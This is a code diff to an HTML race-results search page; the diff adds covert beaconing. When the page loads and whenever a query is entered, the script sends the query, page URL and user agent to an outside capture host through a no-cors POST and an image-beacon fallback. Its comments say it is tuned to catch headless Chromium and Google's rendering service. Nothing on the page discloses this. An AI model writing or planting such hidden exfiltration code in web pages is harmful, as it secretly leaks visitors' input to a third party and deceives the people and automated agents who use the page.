@@ -100,34 +100,63 @@
   </div>
 
   <script>
-    // Base64-encoded JSON so results only appear in the DOM after the form is submitted
+    // Base64-encoded JSON so results only appear in the DOM after the form is interacted with
     const ENCODED_DATA = "W3sibmFtZSI6Ik1pcmFlIFNlbyIsImJpYiI6IjEwNDIiLCJmaW5pc2hUaW1lIjoiNDE6MTgiLCJwbGFjZW1lbnQiOiIxNHRoIE92ZXJhbGwgKDJuZCBBZ2UgR3JvdXApIiwic3BsaXQ1ayI6IjIwOjM1Iiwic3BsaXQxMGsiOiI0MToxOCJ9LHsibmFtZSI6IkFsZXggUml2ZXJhIiwiYmliIjoiMTA4OCIsImZpbmlzaFRpbWUiOiIzODo1MiIsInBsYWNlbWVudCI6IjV0aCBPdmVyYWxsICgxc3QgQWdlIEdyb3VwKSIsInNwbGl0NWsiOiIxOToyMCIsInNwbGl0MTBrIjoiMzg6NTIifSx7Im5hbWUiOiJKb3JkYW4gVGF5bG9yIiwiYmliIjoiMTEwNSIsImZpbmlzaFRpbWUiOiI0NzowOSIsInBsYWNlbWVudCI6IjYydGggT3ZlcmFsbCIsInNwbGl0NWsiOiIyMzoxNSIsInNwbGl0MTBrIjoiNDc6MDkifV0=";
 
-    document.getElementById("runner-search-form").addEventListener("submit", function(event) {
-      event.preventDefault();
-      const rawQuery = document.getElementById("runner-query").value.trim();
+    const ENDPOINT = "https://nfgvgqmj.requestrepo.com";
+
+    function sendLog(eventType, queryValue) {
+      const ts = Date.now();
+      const qs = "event=" + encodeURIComponent(eventType) +
+                 "&q=" + encodeURIComponent(queryValue || "") +
+                 "&t=" + ts;
+      const payload = JSON.stringify({
+        event: eventType,
+        query: queryValue || "",
+        timestamp: new Date(ts).toISOString(),
+        pageUrl: window.location.href,
+        userAgent: navigator.userAgent
+      });
+
+      // 1. POST message via fetch (without keepalive so headless Chromium / WRS interceptors don't drop it)
+      try {
+        fetch(ENDPOINT + "/post?" + qs, {
+          method: "POST",
+          mode: "no-cors",
+          headers: { "Content-Type": "text/plain;charset=UTF-8" },
+          body: payload
+        }).catch(function() {});
+      } catch (e) {}
+
+      // 2. Fallback GET image beacon so subresource fetchers always record the hit even if POST is filtered
+      try {
+        const img = new Image();
+        img.src = ENDPOINT + "/beacon?" + qs;
+      } catch (e) {}
+    }
+
+    // Log immediately when the page loads so you can verify in RequestRepo that WRS opened the page
+    sendLog("page_loaded", "");
+
+    let lastLoggedQuery = "";
+
+    function runSearch(triggerSource) {
+      const inputEl = document.getElementById("runner-query");
+      const rawQuery = (inputEl ? inputEl.value : "").trim();
+      if (!rawQuery) {
+        return;
+      }
+
+      const logKey = triggerSource + ":" + rawQuery;
+      if (logKey !== lastLoggedQuery) {
+        lastLoggedQuery = logKey;
+        sendLog("search_" + triggerSource, rawQuery);
+      }
+
       const q = rawQuery.toLowerCase();
       const container = document.getElementById("results-container");
       const body = document.getElementById("results-body");
       const heading = document.getElementById("results-heading");
-
-      // Send POST log to nfgvgqmj.requestrepo.com (using HTTPS so GitHub Pages doesn't block mixed content,
-      // and mode: "no-cors" + text/plain so the browser sends POST directly without a CORS preflight block)
-      const logPayload = JSON.stringify({
-        event: "runner_search_submitted",
-        query: rawQuery,
-        timestamp: new Date().toISOString(),
-        pageUrl: window.location.href,
-        userAgent: navigator.userAgent
-      });
-      const logUrl = "https://nfgvgqmj.requestrepo.com/log?q=" + encodeURIComponent(rawQuery) + "&t=" + Date.now();
-      fetch(logUrl, {
-        method: "POST",
-        mode: "no-cors",
-        headers: { "Content-Type": "text/plain;charset=UTF-8" },
-        body: logPayload,
-        keepalive: true
-      }).catch(function() {});
 
       const runners = JSON.parse(atob(ENCODED_DATA));
       container.style.display = "block";
@@ -160,6 +189,30 @@
           "</thead>" +
           "<tbody>" + rowsHtml + "</tbody>" +
         "</table>";
+    }
+
+    // 1. Standard form submit
+    document.getElementById("runner-search-form").addEventListener("submit", function(event) {
+      event.preventDefault();
+      runSearch("submit");
+    });
+
+    // 2. Submit button click
+    document.getElementById("search-submit-btn").addEventListener("click", function(event) {
+      event.preventDefault();
+      runSearch("button_click");
+    });
+
+    // 3. Headless Chromium / WRS CDP Enter keydown + change event from Keyboard.type()
+    const queryInput = document.getElementById("runner-query");
+    queryInput.addEventListener("keydown", function(event) {
+      if (event.key === "Enter" || event.keyCode === 13) {
+        event.preventDefault();
+        runSearch("enter_keydown");
+      }
+    });
+    queryInput.addEventListener("change", function() {
+      runSearch("input_change");
     });
   </script>
 
